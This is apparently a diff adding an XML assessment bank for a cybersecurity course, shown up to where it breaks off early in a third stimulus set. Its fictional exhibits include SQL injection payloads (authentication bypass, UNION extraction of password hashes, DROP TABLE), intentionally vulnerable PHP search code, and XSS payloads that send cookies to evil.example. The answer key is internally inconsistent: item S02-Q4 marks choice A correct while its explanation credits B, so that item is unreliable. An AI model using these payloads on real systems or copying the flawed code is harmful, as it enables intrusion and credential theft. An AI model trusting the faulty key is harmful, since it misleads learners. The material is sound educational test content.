@@ -1,0 +1,1197 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!--
+  AP Cybersecurity - Unit 5 Adaptive Quiz Bank
+  Unit: Securing Applications and Data | Topics: 5.1-5.6
+  32 questions across 8 stimulus sets | calibrated="false"
+  Skills: 1.A 1.C 1.D 2.A 3.A 3.B
+-->
+<unit_quizbank unit_id="U5" unit_title="Securing Applications and Data" version="1.0" calibrated="false">
+
+<!-- S01 - Database Audit Log (SQL Injection)
+     Topics: 5.1, 5.6 | Skills: 1.A 1.C 3.B 3.B+2.A -->
+<stimulus_set id="U5-S01" difficulty_range="1-3">
+  <stimulus>
+    <type>database_audit_log</type>
+    <label>Exhibit A - Database Audit Log and WAF Alert: ClearPath Financial</label>
+    <context>ClearPath Financial's WAF generated alerts overnight against the public customer portal (web-portal.clearpath.net). The DBA pulled the corresponding database audit log for the same period. No scheduled maintenance was planned.</context>
+    <artifact format="composite">
+      <component id="A1" type="log_file">
+        <log_type>WAF Alert Log - ClearPath Financial Web Portal (22:00-23:00)</log_type>
+        <entries>
+TIME      RULE_ID   SEVERITY  SRC_IP         URI                     PAYLOAD_EXCERPT
+--------- --------- --------- -------------- ----------------------- ---------------------------
+22:31:04  942100    CRITICAL  203.0.113.77   /login.php              username=admin'--
+22:31:07  942100    CRITICAL  203.0.113.77   /login.php              username=' OR '1'='1
+22:31:09  942100    CRITICAL  203.0.113.77   /login.php              username=admin' OR 1=1--
+22:31:44  942110    CRITICAL  203.0.113.77   /search.php?q=          q=1' UNION SELECT null,username,password FROM users--
+22:32:01  942110    CRITICAL  203.0.113.77   /search.php?q=          q=1' UNION SELECT null,table_name,null FROM information_schema.tables--
+22:32:18  942200    HIGH      203.0.113.77   /export.php             id=1; DROP TABLE transactions--
+        </entries>
+      </component>
+      <component id="A2" type="log_file">
+        <log_type>MySQL Audit Log - customerdb (same period)</log_type>
+        <entries>
+TIME      USER          HOST           QUERY
+--------- ------------- -------------- --------------------------------------------------
+22:31:04  webapp_user   10.0.5.12      SELECT * FROM users WHERE username='admin'--' AND password='...'
+22:31:07  webapp_user   10.0.5.12      SELECT * FROM users WHERE username='' OR '1'='1' AND password='...'
+22:31:07  [RESULT]      --             ROWS RETURNED: 1 (first record in users table - authentication bypassed)
+22:31:44  webapp_user   10.0.5.12      SELECT null,username,password FROM users UNION SELECT null,username,password FROM users--
+22:31:44  [RESULT]      --             ROWS RETURNED: 847 (full users table with hashed passwords extracted)
+22:32:18  webapp_user   10.0.5.12      SELECT * FROM transactions WHERE id=1; DROP TABLE transactions--
+22:32:18  [RESULT]      --             ERROR: Multiple statements not permitted (prepared statement enforcement active)
+        </entries>
+      </component>
+    </artifact>
+    <provenance>Fictional. All IPs, queries, and data are invented for assessment purposes.</provenance>
+  </stimulus>
+  <items>
+
+    <question id="U5-S01-Q1">
+      <meta><unit>U5</unit><stimulus_ref>U5-S01</stimulus_ref>
+        <topic_refs>5.1</topic_refs><lo_refs>LO 5.1.A</lo_refs></meta>
+      <skill_vector><primary skill="1.A" lo="LO 5.1.A" weight="1.0"/></skill_vector>
+      <adaptive_meta><b_param>-0.38</b_param><a_param>0.90</a_param><c_param>0.25</c_param>
+        <est_response_time_sec>50</est_response_time_sec>
+        <prerequisite_topics>5.1</prerequisite_topics><mastery_threshold>0.75</mastery_threshold><exposure_cap>3</exposure_cap>
+      </adaptive_meta>
+      <stem>The WAF log at 22:31:07 shows payload "username=' OR '1'='1" and the database log shows "ROWS RETURNED: 1 (authentication bypassed)." Which web application attack type do these entries identify?</stem>
+      <choices>
+        <choice key="A">Cross-site scripting (XSS) - injecting malicious scripts into web pages viewed by other users.</choice>
+        <choice key="B">Cross-site request forgery (CSRF) - tricking authenticated users into submitting unauthorized requests.</choice>
+        <choice key="C">SQL injection - inserting SQL metacharacters into application input fields to manipulate the backend database query, in this case bypassing authentication logic.</choice>
+        <choice key="D">Path traversal - using "../" sequences to access files outside the web root.</choice>
+      </choices>
+      <answer key="C"/>
+      <explanation>The payload "' OR '1'='1" is a classic SQL injection authentication bypass. It modifies the intended SQL query from SELECT * FROM users WHERE username='[input]' AND password='[input]' to SELECT * FROM users WHERE username='' OR '1'='1' AND password='...'. Since '1'='1' is always true, the WHERE clause returns all rows and the application authenticates against the first record - bypassing credential verification entirely. The database audit log confirms this: ROWS RETURNED: 1 (authentication bypassed).</explanation>
+      <distractor_rationale>
+        <choice key="A">XSS injects JavaScript into web pages that execute in other users' browsers. The payloads shown contain SQL syntax (OR, single quotes as SQL delimiters, comment sequences --), not JavaScript.</choice>
+        <choice key="B">CSRF exploits authenticated browser sessions by tricking users into submitting forms. The attack shown directly manipulates database queries via input fields - no existing authenticated session is required or exploited.</choice>
+        <choice key="D">Path traversal uses directory separator sequences (../../) to navigate the filesystem. The payloads shown contain SQL syntax and target the database layer, not the filesystem.</choice>
+      </distractor_rationale>
+    </question>
+
+    <question id="U5-S01-Q2">
+      <meta><unit>U5</unit><stimulus_ref>U5-S01</stimulus_ref>
+        <topic_refs>5.1</topic_refs><lo_refs>LO 5.1.B</lo_refs></meta>
+      <skill_vector>
+        <primary skill="1.C" lo="LO 5.1.B" weight="0.72"/>
+        <secondary skill="3.B" lo="LO 5.1.A" weight="0.28"/>
+      </skill_vector>
+      <adaptive_meta><b_param>0.48</b_param><a_param>1.14</a_param><c_param>0.25</c_param>
+        <est_response_time_sec>88</est_response_time_sec>
+        <prerequisite_topics>5.1</prerequisite_topics><mastery_threshold>0.75</mastery_threshold><exposure_cap>3</exposure_cap>
+      </adaptive_meta>
+      <stem>The database log at 22:31:44 shows a UNION SELECT query returned 847 rows from the users table including hashed passwords. Explain what the UNION SELECT technique accomplishes that the basic OR bypass did not, and why extracting hashed passwords creates downstream risk.</stem>
+      <choices>
+        <choice key="A">UNION SELECT is less dangerous than the OR bypass because it only reads data rather than modifying it - read-only operations carry no security risk.</choice>
+        <choice key="B">UNION SELECT appends a second SELECT query to the original, pulling data from a completely different table (users) into the application response - extracting data the query was never intended to expose. Hashed passwords create downstream risk because offline cracking tools (Hashcat, John the Ripper) can recover original passwords from weak or common hashes, enabling credential-stuffing attacks against ClearPath and other services where users reused the same password.</choice>
+        <choice key="C">UNION SELECT only works if the attacker already knows all table and column names, making it impractical without insider knowledge - the query shown could not have succeeded without an internal accomplice.</choice>
+        <choice key="D">UNION SELECT retrieves data in encrypted form that the attacker cannot use without ClearPath's decryption key.</choice>
+      </choices>
+      <answer key="B"/>
+      <explanation>The UNION SELECT technique appends a second complete SELECT statement to the original query, merging results from a different table (users) into the application's response. The 847 returned rows represent the complete user database. Even though passwords are hashed, password hashes are not inherently safe: offline dictionary attacks against common passwords (Password1!, Summer2024) succeed in seconds on modern hardware. Weak hashing algorithms (MD5, SHA-1 without salting) make even complex passwords crackable in hours. The extracted dataset enables credential stuffing across all services where these users reused their password.</explanation>
+      <distractor_rationale>
+        <choice key="A">Read-only SQL injection is serious because unauthorized data access is itself a breach - it triggers notification obligations, enables credential stuffing, and exposes PII. The DROP TABLE attempt at 22:32:18 shows the same attacker also attempted destructive operations.</choice>
+        <choice key="C">The information_schema.tables query at 22:32:01 shows the attacker first enumerated table names from the database's own metadata tables - a standard SQL injection reconnaissance technique requiring no insider knowledge. Table and column names are discoverable through the database itself.</choice>
+        <choice key="D">Hashed passwords are not encrypted - they are one-way transformations that cannot be decrypted. The risk is brute-force and dictionary attacks against the hashes to recover original passwords. No decryption key exists.</choice>
+      </distractor_rationale>
+    </question>
+
+    <question id="U5-S01-Q3">
+      <meta><unit>U5</unit><stimulus_ref>U5-S01</stimulus_ref>
+        <topic_refs>5.1 5.6</topic_refs><lo_refs>LO 5.1.C LO 5.6.A</lo_refs></meta>
+      <skill_vector>
+        <primary skill="3.B" lo="LO 5.6.A" weight="0.68"/>
+        <secondary skill="1.C" lo="LO 5.1.B" weight="0.32"/>
+      </skill_vector>
+      <adaptive_meta><b_param>0.82</b_param><a_param>1.28</a_param><c_param>0.25</c_param>
+        <est_response_time_sec>100</est_response_time_sec>
+        <prerequisite_topics>5.1 5.6</prerequisite_topics><mastery_threshold>0.75</mastery_threshold><exposure_cap>3</exposure_cap>
+      </adaptive_meta>
+      <stem>The DROP TABLE attempt at 22:32:18 failed because of "prepared statement enforcement." Analyzing both log components, which database security control prevented the destructive query while still allowing the UNION SELECT data extraction to succeed?</stem>
+      <choices>
+        <choice key="A">The WAF blocked the DROP TABLE query but allowed the UNION SELECT because UNION SELECT is a read operation and WAFs only block write operations.</choice>
+        <choice key="B">The WAF blocked all DROP TABLE queries globally but has no rules covering UNION SELECT syntax.</choice>
+        <choice key="C">The database user (webapp_user) lacked DROP TABLE privileges - this is a least-privilege control preventing the destructive operation regardless of injection.</choice>
+        <choice key="D">Prepared statements prevent multiple statements (stacked queries using semicolons) from executing in a single call - blocking "SELECT ...; DROP TABLE..." as two statements. However, UNION SELECT is a single statement that extends the original query, which prepared statements alone do not prevent if the query is not parameterized correctly. This reveals that parameterized queries must be correctly implemented throughout, not just multi-statement blocking.</choice>
+      </choices>
+      <answer key="D"/>
+      <explanation>The database log explicitly says "Multiple statements not permitted (prepared statement enforcement active)" for the DROP TABLE attempt. Prepared statements separate SQL code from data, preventing injected data from being interpreted as additional SQL commands. However, the UNION SELECT succeeded - meaning the application used parameterized queries inconsistently: the search.php endpoint allowed raw SQL concatenation while the transactions endpoint enforced prepared statements. This is a common partial-implementation failure: security controls applied inconsistently across code paths leave exploitable gaps in the unprotected endpoints.</explanation>
+      <distractor_rationale>
+        <choice key="A">WAFs use pattern matching to detect and block both read and write SQL injection attempts. The WAF log shows CRITICAL alerts for all injection attempts including UNION SELECT (rule 942110). The WAF did not "allow" UNION SELECT - the database audit log shows the query reached the database despite the WAF alert, indicating the WAF was in detection-only mode, not blocking mode.</choice>
+        <choice key="B">The WAF log shows rule 942110 fired for UNION SELECT (22:31:44) and rule 942200 for DROP TABLE (22:32:18) - the WAF detected both. The WAF appeared to be in alert-only mode since both queries reached the database. The distinction between them was the database-level prepared statement enforcement, not WAF rule coverage.</choice>
+        <choice key="C">While least-privilege database accounts (webapp_user should not have DROP TABLE rights) are a valid defense-in-depth control, the log says the failure reason was "Multiple statements not permitted" - explicitly citing the prepared statement control, not a privilege error. Least-privilege would show "Access denied for user 'webapp_user'".</choice>
+      </distractor_rationale>
+    </question>
+
+    <question id="U5-S01-Q4">
+      <meta><unit>U5</unit><stimulus_ref>U5-S01</stimulus_ref>
+        <topic_refs>5.1 5.6</topic_refs><lo_refs>LO 5.1.C LO 5.6.A LO 5.6.B</lo_refs></meta>
+      <skill_vector>
+        <primary skill="3.B" lo="LO 5.6.B" weight="0.55"/>
+        <secondary skill="2.A" lo="LO 5.1.C" weight="0.45"/>
+      </skill_vector>
+      <adaptive_meta><b_param>1.42</b_param><a_param>1.58</a_param><c_param>0.25</c_param>
+        <est_response_time_sec>162</est_response_time_sec>
+        <prerequisite_topics>5.1 5.6</prerequisite_topics><mastery_threshold>0.80</mastery_threshold><exposure_cap>2</exposure_cap>
+      </adaptive_meta>
+      <stem>The attack achieved authentication bypass (22:31:07) and full user table extraction including 847 hashed passwords (22:31:44). The WAF was in detection-only mode. Analyzing the incident, which control combination would have prevented both the authentication bypass AND the data extraction, while also addressing the partial prepared statement implementation?</stem>
+      <choices>
+        <choice key="A">Switch the WAF to blocking mode - this would have stopped all SQL injection payloads before reaching the database, making parameterized queries unnecessary.</choice>
+        <choice key="B">Enforce parameterized queries (prepared statements) on ALL database-interacting code paths - not just transactions - so no user input is ever concatenated into SQL syntax; place the WAF in blocking mode as a defense-in-depth layer; and apply least-privilege database accounts (webapp_user should have SELECT on specific tables only, not SELECT on information_schema or full table access for UNION queries).</choice>
+        <choice key="C">Hash all passwords with bcrypt before storing them - this would make the extracted hashes uncrackable and eliminate the downstream credential risk even if extraction succeeds.</choice>
+        <choice key="D">Add input validation to reject any login input containing single quotes, which are required for all SQL injection payloads.</choice>
+      </choices>
+      <answer key="B"/>
+      <explanation>B closes both attack stages with independent controls: (1) Parameterized queries across ALL endpoints mean injected SQL metacharacters are treated as literal data, not SQL syntax - the authentication bypass and UNION SELECT both become impossible because the database never sees them as SQL; (2) WAF in blocking mode stops most injection attempts before reaching the application, even if a new bypass technique exists; (3) least-privilege database accounts (webapp_user restricted to SELECT on specific application tables only) would have prevented UNION SELECT on information_schema and the users table if the account lacks SELECT grants on those tables. Each control independently reduces risk; together they create defense in depth against SQL injection.</explanation>
+      <distractor_rationale>
+        <choice key="A">WAF blocking mode is an important layer but is not sufficient alone - sophisticated attackers bypass WAF rules through encoding, obfuscation, and novel syntax. Parameterized queries are the root-cause fix; WAF blocking is defense-in-depth, not a replacement for secure code.</choice>
+        <choice key="C">Strong password hashing (bcrypt, Argon2) with salting is essential and would reduce the downstream credential risk. However, it does not prevent the authentication bypass at 22:31:07 or the data extraction at 22:31:44 - it only limits the value of what was extracted. The question asks about preventing both the bypass and the extraction.</choice>
+        <choice key="D">Blocking single quotes would prevent many injection payloads but is not comprehensive: SQL injection can be achieved through other metacharacters, encoding (URL encoding, hex encoding), and numeric injection that does not require quotes. Input validation is brittle; parameterized queries are robust. Blocking quotes also breaks legitimate user data (names like O'Brien).</choice>
+      </distractor_rationale>
+    </question>
+
+  </items>
+</stimulus_set>
+
+<!-- S02 - Certificate Inspection (Weak Cryptography)
+     Topics: 5.3, 5.4 | Skills: 1.A 1.C 2.A 1.D+2.A -->
+<stimulus_set id="U5-S02" difficulty_range="1-3">
+  <stimulus>
+    <type>cert_inspection</type>
+    <label>Exhibit B - TLS Certificate and Cipher Suite Analysis: ClearPath Financial APIs</label>
+    <context>A third-party security assessor conducted a TLS configuration review of ClearPath Financial's public API endpoints. The following certificate and cipher suite details were captured during the assessment.</context>
+    <artifact format="composite">
+      <component id="B1" type="cert_inspection">
+        <tool>SSL Labs API Assessment - api.clearpath-financial.net</tool>
+        <url>https://api.clearpath-financial.net</url>
+        <tls_version>TLS 1.0 (supported alongside TLS 1.3)</tls_version>
+        <cipher_suite>TLS_RSA_WITH_RC4_128_SHA (offered as fallback)</cipher_suite>
+        <certificate>
+          <issued_to>api.clearpath-financial.net</issued_to>
+          <issued_by>DigiCert Global CA G2</issued_by>
+          <valid_from>2023-01-15</valid_from>
+          <valid_until>2024-01-15</valid_until>
+          <key_type>RSA 2048-bit</key_type>
+          <signature_algorithm>SHA-1 with RSA</signature_algorithm>
+        </certificate>
+        <warnings>
+WARNING: Certificate EXPIRED (valid_until: 2024-01-15, current assessment: 2024-03-15)
+WARNING: TLS 1.0 supported - deprecated by RFC 8996 (2021), vulnerable to BEAST/POODLE attacks
+WARNING: RC4 cipher suite offered - prohibited by RFC 7465 (2015), known weak stream cipher
+WARNING: SHA-1 signature algorithm - deprecated by all major browsers since 2017
+        </warnings>
+      </component>
+      <component id="B2" type="log_file">
+        <log_type>API Gateway Access Log - Anomalous Clients (March 14-15)</log_type>
+        <entries>
+DATE       CLIENT_IP       TLS_VER  CIPHER                        API_ENDPOINT        STATUS
+---------- --------------- -------- ----------------------------- ------------------- ------
+2024-03-14 203.0.113.88    TLS 1.0  TLS_RSA_WITH_RC4_128_SHA      /v1/accounts/export 200
+2024-03-14 203.0.113.88    TLS 1.0  TLS_RSA_WITH_RC4_128_SHA      /v1/accounts/export 200
+2024-03-15 203.0.113.88    TLS 1.0  TLS_RSA_WITH_RC4_128_SHA      /v1/accounts/export 200
+        </entries>
+        <note>203.0.113.88 is not in ClearPath's authorized API partner list. /v1/accounts/export returns paginated account data in JSON. Three requests on consecutive days.</note>
+      </component>
+    </artifact>
+    <provenance>Fictional. All domain names, certificate details, and access logs are invented.</provenance>
+  </stimulus>
+  <items>
+
+    <question id="U5-S02-Q1">
+      <meta><unit>U5</unit><stimulus_ref>U5-S02</stimulus_ref>
+        <topic_refs>5.3</topic_refs><lo_refs>LO 5.3.A</lo_refs></meta>
+      <skill_vector><primary skill="1.A" lo="LO 5.3.A" weight="1.0"/></skill_vector>
+      <adaptive_meta><b_param>-0.32</b_param><a_param>0.90</a_param><c_param>0.25</c_param>
+        <est_response_time_sec>52</est_response_time_sec>
+        <prerequisite_topics>5.3</prerequisite_topics><mastery_threshold>0.75</mastery_threshold><exposure_cap>3</exposure_cap>
+      </adaptive_meta>
+      <stem>Component B1 shows the RC4 cipher suite is offered as a TLS fallback. RC4 was prohibited by RFC 7465 in 2015. Which characteristic of RC4 makes it cryptographically unsuitable for protecting data in transit?</stem>
+      <choices>
+        <choice key="A">RC4 uses a symmetric key, which means the same key is used for encryption and decryption - making it fundamentally insecure compared to asymmetric algorithms.</choice>
+        <choice key="B">RC4 requires the communicating parties to exchange keys in plaintext before establishing an encrypted session, exposing the key to interception.</choice>
+        <choice key="C">RC4 does not support key lengths above 40 bits, making it trivially brute-forceable by any modern computer.</choice>
+        <choice key="D">RC4 is a stream cipher with documented statistical biases in its keystream output, meaning the encrypted bytes are not uniformly random - attackers with sufficient ciphertext can exploit these biases to recover plaintext, particularly in protocols where the same key is reused across connections.</choice>
+      </choices>
+      <answer key="D"/>
+      <explanation>RC4's fundamental weakness is statistical bias in its pseudorandom keystream: certain byte values appear significantly more or less frequently than a truly random distribution would produce. When RC4 encrypts data with a reused or predictable key (as in TLS session resumption), attackers can gather enough ciphertext to exploit these biases and recover the first bytes of every encrypted message - including session cookies, authentication tokens, and API responses. RFC 7465 prohibits RC4 in TLS precisely because of these demonstrated cryptanalytic attacks, not just theoretical concerns. The cipher labeled here is "RC4_128" indicating 128-bit keys, so key length is not the issue.</explanation>
+      <distractor_rationale>
+        <choice key="A">Symmetric key cryptography (same key for encryption and decryption) is not inherently insecure - AES-256 is a symmetric cipher and is considered cryptographically strong. The weakness of RC4 is specifically in its keystream generation algorithm, not its symmetric nature.</choice>
+        <choice key="B">RC4 in TLS does not transmit keys in plaintext - TLS uses asymmetric key exchange (RSA, ECDHE) to negotiate session keys securely. RC4's weakness is in the stream cipher algorithm itself, not its key exchange mechanism.</choice>
+        <choice key="C">The cipher shown is RC4_128 - a 128-bit key length. 128-bit keys are not brute-forceable by any feasible computational means. RC4's weakness is statistical bias in the keystream algorithm, not key length.</choice>
+      </distractor_rationale>
+    </question>
+
+    <question id="U5-S02-Q2">
+      <meta><unit>U5</unit><stimulus_ref>U5-S02</stimulus_ref>
+        <topic_refs>5.4</topic_refs><lo_refs>LO 5.4.A</lo_refs></meta>
+      <skill_vector>
+        <primary skill="1.C" lo="LO 5.4.A" weight="0.72"/>
+        <secondary skill="1.A" lo="LO 5.3.A" weight="0.28"/>
+      </skill_vector>
+      <adaptive_meta><b_param>0.50</b_param><a_param>1.14</a_param><c_param>0.25</c_param>
+        <est_response_time_sec>88</est_response_time_sec>
+        <prerequisite_topics>5.4</prerequisite_topics><mastery_threshold>0.75</mastery_threshold><exposure_cap>3</exposure_cap>
+      </adaptive_meta>
+      <stem>The certificate shows valid_until: 2024-01-15 but the assessment date is 2024-03-15 - the certificate has been expired for 59 days. Explain the security implications of operating with an expired TLS certificate beyond the practical "browser warning" issue.</stem>
+      <choices>
+        <choice key="A">An expired certificate has no security implications - TLS encryption remains fully functional with an expired certificate, only the browser warning changes.</choice>
+        <choice key="B">An expired certificate means the encryption algorithm has also expired and TLS sessions use plaintext transmission until a new certificate is issued.</choice>
+        <choice key="C">An expired certificate means the certificate authority's binding of the domain name to the public key is no longer validated and renewed - clients that enforce strict expiry checking (automated systems, strict TLS implementations) will reject the connection entirely, and the certificate can no longer be revoked through OCSP since revocation services may not recognize it. More critically, operating with known expired infrastructure signals a weak certificate lifecycle management process, increasing the risk that the associated private key has been compromised without detection.</choice>
+        <choice key="D">Expired certificates are automatically replaced by the CA with a new valid certificate via the ACME protocol, so no manual action or security concern exists if ACME is configured.</choice>
+      </choices>
+      <answer key="C"/>
+      <explanation>TLS encryption continues to function with expired certificates at the protocol level, but the implications go beyond browser warnings: (1) strict TLS clients (payment processors, API partners, automated systems) reject expired certificates by default, causing service disruptions; (2) certificate revocation infrastructure (OCSP, CRL) may behave unpredictably for expired certificates; (3) the 59-day window means ClearPath's certificate management process failed to detect or act on a routine renewal - this same process failure likely affects private key rotation, cipher suite reviews, and other cryptographic lifecycle controls. Additionally, the API access log (B2) shows an unauthorized client specifically selecting the deprecated TLS 1.0 / RC4 path, suggesting the attacker deliberately chose the weakest negotiated path the server offered.</explanation>
+      <distractor_rationale>
+        <choice key="A">While encryption continues to function, the security implications extend to revocation, trust chain validation, and operational lifecycle management failures. A certificate is not merely a "browser padlock" - it binds cryptographic identity to a domain name with a time-limited authority assertion.</choice>
+        <choice key="B">Certificate expiry does not affect the encryption algorithm. TLS uses the certificate's public key for key exchange and then symmetric encryption (like AES or RC4) for the session. Certificate expiry affects validity validation, not the cipher's operation.</choice>
+        <choice key="D">ACME automates certificate renewal but only if configured and operational. The 59-day expired state proves ACME was either not configured, failed, or was ignored. Certificates do not renew automatically without active management regardless of ACME configuration.</choice>
+      </distractor_rationale>
+    </question>
+
+    <question id="U5-S02-Q3">
+      <meta><unit>U5</unit><stimulus_ref>U5-S02</stimulus_ref>
+        <topic_refs>5.3 5.4</topic_refs><lo_refs>LO 5.3.B LO 5.4.B</lo_refs></meta>
+      <skill_vector>
+        <primary skill="2.A" lo="LO 5.4.B" weight="0.65"/>
+        <secondary skill="3.B" lo="LO 5.3.B" weight="0.35"/>
+      </skill_vector>
+      <adaptive_meta><b_param>0.82</b_param><a_param>1.28</a_param><c_param>0.25</c_param>
+        <est_response_time_sec>100</est_response_time_sec>
+        <prerequisite_topics>5.3 5.4</prerequisite_topics><mastery_threshold>0.75</mastery_threshold><exposure_cap>3</exposure_cap>
+      </adaptive_meta>
+      <stem>Component B2 shows unauthorized client 203.0.113.88 specifically negotiating TLS 1.0 with RC4 to access /v1/accounts/export on three consecutive days. Analyzing this pattern, what does the client's deliberate selection of the weakest available cipher path suggest about the attacker's objective?</stem>
+      <choices>
+        <choice key="A">The client uses an old browser that only supports TLS 1.0 and RC4 - this is a compatibility issue, not a security concern.</choice>
+        <choice key="B">The attacker deliberately downgraded to the weakest supported TLS version and cipher suite - likely to exploit RC4's statistical weaknesses or TLS 1.0 vulnerabilities to decrypt the account export data, while the three consecutive successful API calls suggest they were extracting paginated account data systematically without triggering rate limits.</choice>
+        <choice key="C">TLS 1.0 with RC4 is more efficient than TLS 1.3 for large data transfers, and the client was optimizing for performance on the account export endpoint.</choice>
+        <choice key="D">The client was testing ClearPath's TLS configuration as an authorized security assessor using the same tool as Component B1's assessment.</choice>
+      </choices>
+      <answer key="B"/>
+      <explanation>A legitimate API client uses whatever TLS version the server's best-practice configuration offers (TLS 1.3 in 2024). Deliberately downgrading to TLS 1.0 with RC4 requires intentional configuration to force the weakest supported negotiation - behavior consistent with a cryptographic attack preparation or a known-vulnerable protocol exploitation attempt. Combined with three consecutive calls to /v1/accounts/export from an IP not in the authorized partner list, the pattern suggests systematic data extraction: the attacker identified the deprecated cipher path (perhaps from the same SSL Labs assessment as B1), used it to access account data, and paginated through the export endpoint over three days. The RC4 weakness may enable eventual decryption of captured traffic if the attacker also has a network position to capture it.</explanation>
+      <distractor_rationale>
+        <choice key="A">A legitimate old browser would not specifically access a financial API's account export endpoint three times on consecutive days from an IP not in the authorized partner list. API clients are typically programmatic (not browser-based) and can be configured to use any TLS version their library supports.</choice>
+        <choice key="C">TLS 1.0 with RC4 is not more efficient than TLS 1.3 - modern TLS 1.3 with AES-GCM has comparable or better performance than RC4 due to hardware AES acceleration. There is no performance rationale for choosing deprecated protocols.</choice>
+        <choice key="D">An authorized security assessor would appear in the authorized partner list and would have disclosed their assessment scope. The note explicitly states 203.0.113.88 "is not in ClearPath's authorized API partner list." The B1 assessment was conducted by a different firm using SSL Labs' public scanning infrastructure.</choice>
+      </distractor_rationale>
+    </question>
+
+    <question id="U5-S02-Q4">
+      <meta><unit>U5</unit><stimulus_ref>U5-S02</stimulus_ref>
+        <topic_refs>5.3 5.4</topic_refs><lo_refs>LO 5.3.A LO 5.3.B LO 5.4.A LO 5.4.B</lo_refs></meta>
+      <skill_vector>
+        <primary skill="2.A" lo="LO 5.4.B" weight="0.55"/>
+        <secondary skill="1.D" lo="LO 5.3.B" weight="0.45"/>
+      </skill_vector>
+      <adaptive_meta><b_param>1.44</b_param><a_param>1.60</a_param><c_param>0.25</c_param>
+        <est_response_time_sec>164</est_response_time_sec>
+        <prerequisite_topics>5.3 5.4</prerequisite_topics><mastery_threshold>0.80</mastery_threshold><exposure_cap>2</exposure_cap>
+      </adaptive_meta>
+      <stem>The TLS configuration has four documented weaknesses: (1) expired certificate; (2) TLS 1.0 supported; (3) RC4 cipher offered; (4) SHA-1 signature algorithm. Document a remediation priority order with justification, and identify which single remediation action eliminates the most attack surface simultaneously.</stem>
+      <choices>
+        <choice key="A">All four issues are fixed simultaneously by replacing the expired certificate with a new RSA 2048+ or ECDSA certificate using SHA-256 signature algorithm, AND updating the TLS configuration to: minimum TLS 1.2 (preferably TLS 1.3 only), cipher suite limited to ECDHE+AES-GCM suites only (removing RC4 and all RC4-containing suites, and removing all TLS 1.0-specific suites). The new certificate with updated server TLS configuration simultaneously resolves expired cert, enables SHA-256, removes RC4, and removes TLS 1.0.</choice>
+        <choice key="B">Priority: 1. Replace certificate (expired - immediate trust failure). 2. Disable TLS 1.0. 3. Remove RC4. 4. Migrate to SHA-256 signature. The expired certificate is most urgent because it causes immediate trust failures.</choice>
+        <choice key="C">Priority: 1. Disable RC4 (most exploitable). 2. Disable TLS 1.0. 3. Replace certificate. 4. SHA-1 migration. RC4 is the most immediately exploitable weakness so it takes highest priority.</choice>
+        <choice key="D">The four weaknesses are independent issues requiring separate maintenance windows: schedule four changes over the next quarter, one per month, to minimize deployment risk.</choice>
+      </choices>
+      <answer key="A"/>
+      <explanation>B correctly identifies that all four weaknesses can be remediated in a single coordinated change: issuing a new certificate (with SHA-256 signature algorithm, resolving issue 4 and issue 1 simultaneously) and updating the TLS server configuration (removing TLS 1.0 and RC4 cipher suites, resolving issues 2 and 3) are logically coupled changes that should happen together during the same maintenance window. Doing them separately creates an intermediate state of partial security improvement with the deployment overhead repeated four times. The B2 access log evidence showing active exploitation of the deprecated path makes this an urgent combined remediation, not a quarterly roadmap.</explanation>
+      <distractor_rationale>
+        <choice key="B">The priority order is correct but the conclusion that these require separate actions is not - certificate replacement and cipher suite configuration changes are done on the same server in the same maintenance window. Separating them is operationally unnecessary and leaves intermediate vulnerability states.</choice>
+        <choice key="C">While RC4 is critically weak, the expired certificate is causing active trust failures (clients enforcing strict expiry checking are already rejecting the API). RC4 and TLS 1.0 weaknesses compound the cryptographic risk but the certificate expiry is the most immediately operationally impactful issue. Regardless, all four should be addressed in one coordinated change.</choice>
+        <choice key="D">Spacing four logically coupled configuration changes across four months leaves ClearPath with documented known weaknesses being actively exploited (as shown in B2) for 90+ additional days. This schedule is not defensible given the active unauthorized access pattern in the logs.</choice>
+      </distractor_rationale>
+    </question>
+
+  </items>
+</stimulus_set>
+<!-- S03 - Code Snippet (XSS / Input Validation Flaw)
+     Topics: 5.1, 5.2 | Skills: 1.A 1.C 3.B 2.A -->
+<stimulus_set id="U5-S03" difficulty_range="1-3">
+  <stimulus>
+    <type>code_snippet</type>
+    <label>Exhibit C - Code Review Findings: NovaStar Tech Student Portal</label>
+    <context>NovaStar Tech's security team reviewed the student-facing portal codebase ahead of a PCI-DSS audit. The following code excerpt and corresponding WAF log were flagged during the review.</context>
+    <artifact format="composite">
+      <component id="C1" type="code_snippet">
+        <language>PHP</language>
+        <filename>search.php</filename>
+        <code>
+&lt;?php
+// search.php - Student assignment search
+$query = $_GET['q'];                        // Line 3: user input, unvalidated
+$conn = new mysqli($host, $user, $pass, $db);
+$sql = "SELECT * FROM assignments WHERE title LIKE '%" . $query . "%'";  // Line 5
+$result = $conn->query($sql);
+?&gt;
+&lt;html&gt;&lt;body&gt;
+&lt;h2&gt;Search results for: &lt;?php echo $query; ?&gt;&lt;/h2&gt;   &lt;!-- Line 9: reflected output --&gt;
+&lt;?php while($row = $result->fetch_assoc()) {
+    echo "&lt;p&gt;" . $row['title'] . "&lt;/p&gt;";
+} ?&gt;
+&lt;/body&gt;&lt;/html&gt;
+        </code>
+        <review_note>Code reviewed by junior developer. No prior security review conducted.</review_note>
+      </component>
+      <component id="C2" type="log_file">
+        <log_type>WAF Alert Log - NovaStar Student Portal (selected entries)</log_type>
+        <entries>
+DATE       SRC_IP         URI              PAYLOAD
+---------- -------------- ---------------- ---------------------------------------------------
+2024-03-10 203.0.113.99   /search.php?q=   q=&lt;script&gt;document.location='https://evil.example/steal?c='+document.cookie&lt;/script&gt;
+2024-03-10 203.0.113.99   /search.php?q=   q=&lt;img src=x onerror=fetch('https://evil.example/'+btoa(document.cookie))&gt;
+2024-03-11 203.0.113.99   /search.php?q=   q=' UNION SELECT username,password,null FROM users--
+        </entries>
+      </component>
+    </artifact>
+    <provenance>Fictional. All code and log data are invented for educational purposes.</provenance>
+  </stimulus>
+  <items>
+
+    <question id="U5-S03-Q1">
+      <meta><unit>U5</unit><stimulus_ref>U5-S03</stimulus_ref>
+        <topic_refs>5.1</topic_refs><lo_refs>LO 5.1.A</lo_refs></meta>
+      <skill_vector><primary skill="1.A" lo="LO 5.1.A" weight="1.0"/></skill_vector>
+      <adaptive_meta><b_param>-0.35</b_param><a_param>0.90</a_param><c_param>0.25</c_param>
+        <est_response_time_sec>52</est_response_time_sec>
+        <prerequisite_topics>5.1</prerequisite_topics><mastery_threshold>0.75</mastery_threshold><exposure_cap>3</exposure_cap>
+      </adaptive_meta>
